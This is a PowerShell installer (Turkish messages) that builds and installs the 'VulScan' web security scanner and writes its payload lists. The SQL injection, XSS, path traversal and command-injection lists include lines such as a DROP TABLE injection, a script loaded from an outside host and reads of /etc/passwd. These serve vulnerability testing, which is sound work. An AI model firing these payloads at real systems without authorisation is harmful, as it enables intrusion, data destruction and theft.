# VulScan PowerShell Installer v3.1.0
# Advanced Web Security Scanner
# by ATOMGAMERAGA

param(
    [Parameter(Mandatory=$false)]
    [ValidateSet("stable", "dev", "manual")]
    [string]$Version = "",
    
    [Parameter(Mandatory=$false)]
    [string]$InstallPath = "C:\Program Files\VulScan",
    
    [Parameter(Mandatory=$false)]
    [switch]$CreateDesktopShortcut,
    
    [Parameter(Mandatory=$false)]
    [switch]$Force,
    
    [Parameter(Mandatory=$false)]
    [switch]$Quiet
)

# ASCII Banner
$banner = @"

 ██╗   ██╗██╗   ██╗██╗     ███████╗ ██████╗ █████╗ ███╗   ██╗
 ██║   ██║██║   ██║██║     ██╔════╝██╔════╝██╔══██╗████╗  ██║
 ██║   ██║██║   ██║██║     ███████╗██║     ███████║██╔██╗ ██║
 ╚██╗ ██╔╝██║   ██║██║     ╚════██║██║     ██╔══██║██║╚██╗██║
  ╚████╔╝ ╚██████╔╝███████╗███████║╚██████╗██║  ██║██║ ╚████║
   ╚═══╝   ╚═════╝ ╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝

               VulScan PowerShell Installer v3.1.0
                 Advanced Web Security Scanner
                       by ATOMGAMERAGA

"@

# Configuration
$configDir = "C:\ProgramData\VulScan"
$payloadsDir = "$configDir\payloads"
$tempDir = "$env:TEMP\VulScan_Install_$(Get-Random)"

# URLs for different versions
$urls = @{
    "stable" = @{
        "url" = "https://raw.githubusercontent.com/ATOMGAMERAGA/VulScan/main/main.go"
        "tag" = "v3.0-stable"
        "desc" = "Stable Release - Kararlı sürüm"
    }
    "dev" = @{
        "url" = "https://raw.githubusercontent.com/ATOMGAMERAGA/VulScan/main/dev/main-3.0.1.go"
        "tag" = "v3.0.1-dev"
        "desc" = "Development Release - Geliştirme sürümü"
    }
}

function Write-ColorOutput {
    param(
        [string]$Message,
        [string]$Color = "White",
        [string]$Prefix = "[INFO]"
    )
    
    if (-not $Quiet) {
        $prefixColor = switch ($Prefix) {
            "[ERROR]" { "Red" }
            "[WARNING]" { "Yellow" }
            "[SUCCESS]" { "Green" }
            "[INFO]" { "Cyan" }
            default { "White" }
        }
        
        Write-Host "$Prefix " -ForegroundColor $prefixColor -NoNewline
        Write-Host $Message -ForegroundColor $Color
    }
}

function Test-Administrator {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Test-GoInstalled {
    try {
        $goVersion = & go version 2>$null
        if ($LASTEXITCODE -eq 0) {
            return $true, $goVersion
        }
        return $false, $null
    }
    catch {
        return $false, $null
    }
}

function Get-UserChoice {
    param(
        [string]$Prompt,
        [string[]]$Options,
        [string]$Default = ""
    )
    
    if ($Quiet -and $Default) {
        return $Default
    }
    
    do {
        $choice = Read-Host $Prompt
        if ([string]::IsNullOrEmpty($choice) -and $Default) {
            return $Default
        }
    } while ($choice -notin $Options)
    
    return $choice
}

function Install-VulScan {
    param(
        [string]$SelectedVersion,
        [string]$SourceUrl,
        [string]$VersionTag
    )
    
    try {
        # Create temporary directory
        Write-ColorOutput "Geçici dizin oluşturuluyor..." "White"
        New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
        
        # Download source code
        Write-ColorOutput "Kaynak kod indiriliyor: $SourceUrl" "White"
        $mainGoPath = Join-Path $tempDir "main.go"
        
        try {
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            Invoke-WebRequest -Uri $SourceUrl -OutFile $mainGoPath -UserAgent "VulScan-PowerShell-Installer/3.1.0"
            Write-ColorOutput "Kaynak kod başarıyla indirildi ✓" "Green" "[SUCCESS]"
        }
        catch {
            Write-ColorOutput "Kaynak kod indirilemedi: $($_.Exception.Message)" "Red" "[ERROR]"
            return $false
        }
        
        # Create go.mod
        Write-ColorOutput "Go modülü hazırlanıyor..." "White"
        $goModContent = @"
module VulScan

go 1.19

require (
    golang.org/x/time v0.3.0
    gopkg.in/yaml.v3 v3.0.1
)
"@
        
        Set-Content -Path (Join-Path $tempDir "go.mod") -Value $goModContent
        
        # Build executable
        Write-ColorOutput "VulScan derleniyor..." "White"
        Push-Location $tempDir
        
        try {
            & go mod tidy 2>$null
            & go build -ldflags "-s -w -X main.Version=$VersionTag" -o "vulscan.exe" "main.go" 2>$null
            
            if (-not (Test-Path "vulscan.exe")) {
                throw "Derleme başarısız"
            }
            
            Write-ColorOutput "Derleme başarılı ✓" "Green" "[SUCCESS]"
        }
        catch {
            Write-ColorOutput "Derleme hatası: $($_.Exception.Message)" "Red" "[ERROR]"
            return $false
        }
        finally {
            Pop-Location
        }
        
        return $true
    }
    catch {
        Write-ColorOutput "Kurulum hatası: $($_.Exception.Message)" "Red" "[ERROR]"
        return $false
    }
}

function Install-Files {
    param([string]$VersionTag)
    
    try {
        # Create installation directories
        Write-ColorOutput "Kurulum dizinleri oluşturuluyor..." "White"
        
        if (Test-Path $InstallPath) {
            if ($Force) {
                Remove-Item -Path $InstallPath -Recurse -Force
            }
            else {
                $choice = Get-UserChoice "Mevcut kurulum bulundu. Üzerine yaz? (y/n)" @("y", "n", "Y", "N") "n"
                if ($choice -in @("n", "N")) {
                    Write-ColorOutput "Kurulum iptal edildi." "Yellow" "[WARNING]"
                    return $false
                }
                Remove-Item -Path $InstallPath -Recurse -Force
            }
        }
        
        New-Item -ItemType Directory -Path $InstallPath -Force | Out-Null
        New-Item -ItemType Directory -Path $configDir -Force | Out-Null
        New-Item -ItemType Directory -Path $payloadsDir -Force | Out-Null
        
        # Copy executable
        Write-ColorOutput "Dosyalar kopyalanıyor..." "White"
        $exePath = Join-Path $tempDir "vulscan.exe"
        Copy-Item -Path $exePath -Destination (Join-Path $InstallPath "vulscan.exe") -Force
        
        # Create batch wrapper for shorter command
        $batchContent = @"
@echo off
"$InstallPath\vulscan.exe" %*
"@
        Set-Content -Path (Join-Path $InstallPath "vuls.bat") -Value $batchContent
        
        # Create configuration file
        Write-ColorOutput "Varsayılan yapılandırma oluşturuluyor..." "White"
        $configContent = @"
# VulScan Configuration File
# Generated by PowerShell Installer v3.1.0

scan:
  threads: 5
  timeout: 10
  user_agent: "VulScan/$VersionTag"
  rate_limit: 10

payloads:
  sql_injection: "$payloadsDir\sql.txt"
  xss: "$payloadsDir\xss.txt"
  directory_traversal: "$payloadsDir\lfi.txt"
  command_injection: "$payloadsDir\cmd.txt"

output:
  verbose: false
  format: "json"
  report: false
"@
        Set-Content -Path (Join-Path $configDir "config.yaml") -Value $configContent
        
        # Create payload files
        Write-ColorOutput "Payload dosyaları oluşturuluyor..." "White"
        
        # SQL Injection payloads
        $sqlPayloads = @"
# SQL Injection Payloads - VulScan v3.1.0
' OR '1'='1
' OR 1=1 --
' UNION SELECT NULL--
'; DROP TABLE users; --
' AND SLEEP(5) --
' OR IF(1=1,SLEEP(5),0) --
admin'--
admin' #
) or '1'='1--
) or ('1'='1--
' UNION SELECT 1,2,3,4,5,version(),7,8,9,10--
' or 1=1#
' or 1=1/*
"@ -replace "`r`n", "`n"
        
        # XSS payloads
        $xssPayloads = @"
# XSS Payloads - VulScan v3.1.0
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
javascript:alert('XSS')
'><script>alert('XSS')</script>
"><script>alert('XSS')</script>
<iframe src="javascript:alert('XSS')">
<body onload=alert('XSS')>
<div onmouseover="alert('XSS')">test</div>
<script src=//brutelogic.com.br/1.js></script>
"@ -replace "`r`n", "`n"
        
        # Directory Traversal payloads
        $lfiPayloads = @"
# Directory Traversal / LFI Payloads - VulScan v3.1.0
../
..\
../../../etc/passwd
..\..\..\windows\system32\drivers\etc\hosts
....//....//....//etc/passwd
....\\....\\....\\windows\system32\drivers\etc\hosts
%2e%2e%2f
%2e%2e%5c
..%252f..%252f..%252fetc%252fpasswd
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
"@ -replace "`r`n", "`n"
        
        # Command Injection payloads
        $cmdPayloads = @"
# Command Injection Payloads - VulScan v3.1.0
; ls
| id
& whoami
`+"`id`"+@"
$(id)
; cat /etc/passwd
| type c:\windows\system32\drivers\etc\hosts
& dir
; uname -a
|| id
&& id
; ping -c 4 127.0.0.1
"@ -replace "`r`n", "`n"
        
        Set-Content -Path (Join-Path $payloadsDir "sql.txt") -Value $sqlPayloads
        Set-Content -Path (Join-Path $payloadsDir "xss.txt") -Value $xssPayloads
        Set-Content -Path (Join-Path $payloadsDir "lfi.txt") -Value $lfiPayloads
        Set-Content -Path (Join-Path $payloadsDir "cmd.txt") -Value $cmdPayloads
        
        return $true
    }
    catch {
        Write-ColorOutput "Dosya kurulum hatası: $($_.Exception.Message)" "Red" "[ERROR]"
        return $false
    }
}

function Add-ToPath {
    try {
        Write-ColorOutput "PATH ortam değişkeni güncelleniyor..." "White"
        
        # Get current system PATH
        $currentPath = [Environment]::GetEnvironmentVariable("PATH", [EnvironmentVariableTarget]::Machine)
        
        # Check if already in PATH
        if ($currentPath -like "*$InstallPath*") {
            Write-ColorOutput "PATH zaten güncel ✓" "Green" "[SUCCESS]"
            return $true
        }
        
        # Add to PATH
        $newPath = "$currentPath;$InstallPath"
        [Environment]::SetEnvironmentVariable("PATH", $newPath, [EnvironmentVariableTarget]::Machine)
        
        # Update current session PATH
        $env:PATH = "$env:PATH;$InstallPath"
        
        Write-ColorOutput "PATH başarıyla güncellendi ✓" "Green" "[SUCCESS]"
        return $true
    }
    catch {
        Write-ColorOutput "PATH güncellenemedi: $($_.Exception.Message)" "Yellow" "[WARNING]"
        return $false
    }
}

function Create-Shortcuts {
    param([string]$VersionTag)
    
    try {
        Write-ColorOutput "Kısayollar oluşturuluyor..." "White"
        
        # Create Start Menu folder
        $startMenuPath = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\VulScan"
        New-Item -ItemType Directory -Path $startMenuPath -Force | Out-Null
        
        # Create WScript Shell COM object
        $WshShell = New-Object -ComObject WScript.Shell
        
        # VulScan shortcut
        $shortcut = $WshShell.CreateShortcut("$startMenuPath\VulScan.lnk")
        $shortcut.TargetPath = "$InstallPath\vulscan.exe"
        $shortcut.WorkingDirectory = $InstallPath
        $shortcut.Description = "VulScan - Web Security Scanner"
        $shortcut.Save()
        
        # Command Prompt shortcut
        $cmdShortcut = $WshShell.CreateShortcut("$startMenuPath\VulScan Command Prompt.lnk")
        $cmdShortcut.TargetPath = "cmd.exe"
        $cmdShortcut.Arguments = "/k echo VulScan $VersionTag - Ready! & echo Type: vulscan --help for usage & echo."
        $cmdShortcut.WorkingDirectory = $env:USERPROFILE
        $cmdShortcut.Description = "VulScan Command Prompt"
        $cmdShortcut.Save()
        
        # Desktop shortcut
        if ($CreateDesktopShortcut) {
            $desktopPath = [Environment]::GetFolderPath("CommonDesktopDirectory")
            $desktopShortcut = $WshShell.CreateShortcut("$desktopPath\VulScan.lnk")
            $desktopShortcut.TargetPath = "$InstallPath\vulscan.exe"
            $desktopShortcut.WorkingDirectory = $InstallPath
            $desktopShortcut.Description = "VulScan - Web Security Scanner"
            $desktopShortcut.Save()
            Write-ColorOutput "Masaüstü kısayolu oluşturuldu ✓" "Green" "[SUCCESS]"
        }
        
        Write-ColorOutput "Kısayollar başarıyla oluşturuldu ✓" "Green" "[SUCCESS]"
        return $true
    }
    catch {
        Write-ColorOutput "Kısayol oluşturma hatası: $($_.Exception.Message)" "Yellow" "[WARNING]"
        return $false
    }
}

function Create-Uninstaller {
    param([string]$VersionTag)
    
    try {
        Write-ColorOutput "Kaldırma programı oluşturuluyor..." "White"
        
        # PowerShell uninstaller script
        $uninstallerContent = @"
# VulScan Uninstaller
# Generated by PowerShell Installer v3.1.0

Write-Host "VulScan Uninstaller" -ForegroundColor Red
Write-Host "==================" -ForegroundColor Red
Write-Host ""

`$confirm = Read-Host "VulScan'i kaldırmak istediğinizden emin misiniz? (y/n)"
if (`$confirm -ne "y" -and `$confirm -ne "Y") {
    Write-Host "Kaldırma iptal edildi." -ForegroundColor Yellow
    Read-Host "Çıkmak için Enter'a basın"
    exit 0
}

Write-Host ""
Write-Host "[INFO] VulScan kaldırılıyor..." -ForegroundColor Cyan

try {
    # Remove from PATH
    `$currentPath = [Environment]::GetEnvironmentVariable("PATH", [EnvironmentVariableTarget]::Machine)
    `$newPath = `$currentPath -replace [regex]::Escape("$InstallPath;"), ""
    `$newPath = `$newPath -replace [regex]::Escape(";$InstallPath"), ""
    [Environment]::SetEnvironmentVariable("PATH", `$newPath, [EnvironmentVariableTarget]::Machine)
    
    # Remove directories
    Remove-Item -Path "$InstallPath" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "$configDir" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "`$env:ProgramData\Microsoft\Windows\Start Menu\Programs\VulScan" -Recurse -Force -ErrorAction SilentlyContinue
    
    # Remove registry entries
    Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\VulScan" -ErrorAction SilentlyContinue
    
    Write-Host "[SUCCESS] VulScan başarıyla kaldırıldı!" -ForegroundColor Green
    Write-Host "[INFO] Yeni terminal oturumu açarak PATH değişikliklerini uygulayın." -ForegroundColor Cyan
}
catch {
    Write-Host "[ERROR] Kaldırma sırasında hata: `$(`$_.Exception.Message)" -ForegroundColor Red
}

Read-Host "Çıkmak için Enter'a basın"
"@
        
        Set-Content -Path (Join-Path $InstallPath "uninstall.ps1") -Value $uninstallerContent
        
        # Create batch wrapper for uninstaller
        $batchUninstaller = @"
@echo off
powershell -ExecutionPolicy Bypass -File "$InstallPath\uninstall.ps1"
pause
"@
        Set-Content -Path (Join-Path $InstallPath "uninstall.bat") -Value $batchUninstaller
        
        # Create uninstall shortcut
        $WshShell = New-Object -ComObject WScript.Shell
        $uninstallShortcut = $WshShell.CreateShortcut("$env:ProgramData\Microsoft\Windows\Start Menu\Programs\VulScan\Uninstall VulScan.lnk")
        $uninstallShortcut.TargetPath = "$InstallPath\uninstall.bat"
        $uninstallShortcut.WorkingDirectory = $InstallPath
        $uninstallShortcut.Description = "Uninstall VulScan"
        $uninstallShortcut.Save()
        
        return $true
    }
    catch {
        Write-ColorOutput "Kaldırma programı oluşturulamadı: $($_.Exception.Message)" "Yellow" "[WARNING]"
        return $false
    }
}

function Register-WithWindows {
    param([string]$VersionTag)
    
    try {
        Write-ColorOutput "Windows Programs listesine ekleniyor..." "White"
        
        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\VulScan"
        
        if (-not (Test-Path $regPath)) {
            New-Item -Path $regPath -Force | Out-Null
        }
        
        Set-ItemProperty -Path $regPath -Name "DisplayName" -Value "VulScan - Web Security Scanner"
        Set-ItemProperty -Path $regPath -Name "DisplayVersion" -Value $VersionTag
        Set-ItemProperty -Path $regPath -Name "Publisher" -Value "ATOMGAMERAGA"
        Set-ItemProperty -Path $regPath -Name "UninstallString" -Value "$InstallPath\uninstall.bat"
        Set-ItemProperty -Path $regPath -Name "InstallLocation" -Value $InstallPath
        Set-ItemProperty -Path $regPath -Name "DisplayIcon" -Value "$InstallPath\vulscan.exe"
        Set-ItemProperty -Path $regPath -Name "NoModify" -Value 1 -Type DWord
        Set-ItemProperty -Path $regPath -Name "NoRepair" -Value 1 -Type DWord
        
        Write-ColorOutput "Kayıt başarılı ✓" "Green" "[SUCCESS]"
        return $true
    }
    catch {
        Write-ColorOutput "Windows kayıt hatası: $($_.Exception.Message)" "Yellow" "[WARNING]"
        return $false
    }
}

function Test-Installation {
    try {
        Write-ColorOutput "Kurulum testi yapılıyor..." "White"
        
        $testResult = & "$InstallPath\vulscan.exe" --version 2>$null
        if ($LASTEXITCODE -eq 0) {
            Write-ColorOutput "✅ Test başarılı!" "Green" "[SUCCESS]"
            return $true
        } else {
            Write-ColorOutput "⚠️ Test başarısız - Manuel kontrol gerekli" "Yellow" "[WARNING]"
            return $false
        }
    }
    catch {
        Write-ColorOutput "⚠️ Test hatası: $($_.Exception.Message)" "Yellow" "[WARNING]"
        return $false
    }
}

function Clean-TempFiles {
    try {
        if (Test-Path $tempDir) {
            Remove-Item -Path $tempDir -Recurse -Force
            Write-ColorOutput "Geçici dosyalar temizlendi ✓" "Green" "[SUCCESS]"
        }
    }
    catch {
        Write-ColorOutput "Geçici dosya temizleme hatası: $($_.Exception.Message)" "Yellow" "[WARNING]"
    }
}

# Main installation process
try {
    if (-not $Quiet) {
        Clear-Host
        Write-Host $banner -ForegroundColor Cyan
    }
    
    # Check administrator privileges
    if (-not (Test-Administrator)) {
        Write-ColorOutput "Bu installer yönetici hakları gerektirir!" "Red" "[ERROR]"
        Write-ColorOutput "PowerShell'i 'Yönetici olarak çalıştır' seçeneği ile açın." "Red" "[ERROR]"
        exit 1
    }
    
    Write-ColorOutput "Yönetici hakları doğrulandı ✓" "Green" "[SUCCESS]"
    
    # Version selection
    if (-not $Version) {
        if (-not $Quiet) {
            Write-Host "══════════════════════════════════════════════════════════════════" -ForegroundColor Yellow
            Write-Host "                         SÜRÜM SEÇİMİ" -ForegroundColor Yellow
            Write-Host "══════════════════════════════════════════════════════════════════" -ForegroundColor Yellow
            Write-Host ""
            Write-Host "Hangi sürümü kurmak istiyorsunuz?" -ForegroundColor White
            Write-Host ""
            Write-Host "[1] Stable Release (v3.0) - Kararlı sürüm" -ForegroundColor Green
            Write-Host "    └─ Ana geliştirme dalı, test edilmiş ve kararlı" -ForegroundColor Gray
            Write-Host ""
            Write-Host "[2] Development Release (v3.0.1-dev) - Geliştirme sürümü" -ForegroundColor Yellow
            Write-Host "    └─ Yeni özellikler, güncel güncellemeler" -ForegroundColor Gray
            Write-Host ""
            Write-Host "[3] Manuel Kurulum - Kendi .exe dosyanızı kullanın" -ForegroundColor Cyan
            Write-Host ""
        }
        
        $choice = Get-UserChoice "Seçiminizi yapın (1/2/3)" @("1", "2", "3") "1"
        
        switch ($choice) {
            "1" { $Version = "stable" }
            "2" { $Version = "dev" }
            "3" { $Version = "manual" }
        }
    }
    
    if ($Version -eq "manual") {
        Write-ColorOutput "Manuel kurulum seçildi" "Cyan"
        Write-ColorOutput "Lütfen 'vulscan.exe' dosyasını bu dizine koyun: $PSScriptRoot" "White"
        
        do {
            $continue = Get-UserChoice "Hazır olduğunuzda 'y' yazın" @("y", "Y") "y"
            if (-not (Test-Path "$PSScriptRoot\vulscan.exe")) {
                Write-ColorOutput "vulscan.exe dosyası bulunamadı!" "Red" "[ERROR]"
            }
        } while (-not (Test-Path "$PSScriptRoot\vulscan.exe"))
        
        # Copy manual exe to temp directory
        New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
        Copy-Item -Path "$PSScriptRoot\vulscan.exe" -Destination "$tempDir\vulscan.exe"
        $selectedVersionTag = "v3.0-manual"
    }
    else {
        $versionInfo = $urls[$Version]
        Write-ColorOutput "$($versionInfo.desc) seçildi" "Green" "[SUCCESS]"
        
        # Check Go installation
        $goInstalled, $goVersion = Test-GoInstalled
        if (-not $goInstalled) {
            Write-ColorOutput "Go bulunamadı! VulScan'i derlemek için Go gerekli." "Red" "[ERROR]"
            Write-ColorOutput "Go'yu şuradan indirin: https://golang.org/dl/" "White"
            exit 1
        }
        
        Write-ColorOutput "Go bulundu: $goVersion ✓" "Green" "[SUCCESS]"
        
        # Download and build
        $buildSuccess = Install-VulScan -SelectedVersion $Version -SourceUrl $versionInfo.url -VersionTag $versionInfo.tag
        if (-not $buildSuccess) {
            exit 1
        }
        
        $selectedVersionTag = $versionInfo.tag
    }
    
    # Install files
    $installSuccess = Install-Files -VersionTag $selectedVersionTag
    if (-not $installSuccess) {
        exit 1
    }
    
    # Add to PATH
    Add-ToPath | Out-Null
    
    # Create shortcuts
    Create-Shortcuts -VersionTag $selectedVersionTag | Out-Null
    
    # Create uninstaller
    Create-Uninstaller -VersionTag $selectedVersionTag | Out-Null
    
    # Register with Windows
    Register-WithWindows -VersionTag $selectedVersionTag | Out-Null
    
    # Test installation
    Test-Installation | Out-Null
    
    # Clean up
    Clean-TempFiles
    
    # Success message
    if (-not $Quiet) {
        Write-Host ""
        Write-Host "══════════════════════════════════════════════════════════════════" -ForegroundColor Green
        Write-Host "                      KURULUM TAMAMLANDI!" -ForegroundColor Green
        Write-Host "══════════════════════════════════════════════════════════════════" -ForegroundColor Green
        Write-Host ""
        Write-Host "✅ VulScan başarıyla kuruldu!" -ForegroundColor Green
        Write-Host ""
        Write-Host "📁 Kurulum dizini: $InstallPath" -ForegroundColor White
        Write-Host "⚙️  Yapılandırma: $configDir\config.yaml" -ForegroundColor White
        Write-Host "🎯 Payloadlar: $payloadsDir\" -ForegroundColor White
        Write-Host ""
        Write-Host "🚀 KULLANIM ÖRNEKLERİ:" -ForegroundColor Yellow
        Write-Host "────────────────────────────────────────────────────────────────" -ForegroundColor Gray
        Write-Host "  vulscan http://example.com" -ForegroundColor Cyan
        Write-Host "  vulscan --help" -ForegroundColor Cyan
        Write-Host "  vulscan --verbose http://example.com/page.php?id=1" -ForegroundColor Cyan
        Write-Host "  vulscan --output report.json --report http://example.com" -ForegroundColor Cyan
        Write-Host "  vuls http://example.com  (kısa komut)" -ForegroundColor Cyan
        Write-Host ""
        Write-Host "💡 İPUCU: Yeni terminal oturumu açarak komutları kullanmaya başlayın!" -ForegroundColor Yellow
        Write-Host ""
        Write-Host "📋 Başlat Menüsü: Başlat > VulScan" -ForegroundColor White
        Write-Host "🗑️  Kaldırmak için: Programs and Features veya uninstall.bat" -ForegroundColor White
        Write-Host ""
        Write-Host "Kurulum tamamlandı! Yeni terminal açarak 'vulscan --help' komutunu deneyin." -ForegroundColor Green
    }
    
    exit 0
}
catch {
    Write-ColorOutput "Kurulum sırasında kritik hata: $($_.Exception.Message)" "Red" "[ERROR]"
    Clean-TempFiles
    exit 1
}
finally {
    if (-not $Quiet) {
        Write-Host ""
        Read-Host "Çıkmak için Enter'a basın"
    }
}
